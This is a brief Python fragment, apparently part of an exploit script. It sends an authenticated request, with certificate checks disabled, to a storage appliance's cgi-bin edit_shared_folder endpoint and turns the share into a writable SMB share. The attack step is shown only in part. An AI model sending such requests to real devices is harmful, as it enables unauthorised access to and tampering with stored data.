...
def run(addr):
    ...
    print conn.content
    requests.get('https://'+addr+':8080/cgi-bin/ezs3/edit_shared_folder?name=b0911659930&nfs=false&smb=true&read_only=false&mode=sync',cookies=resp.cookies,verify=False).content
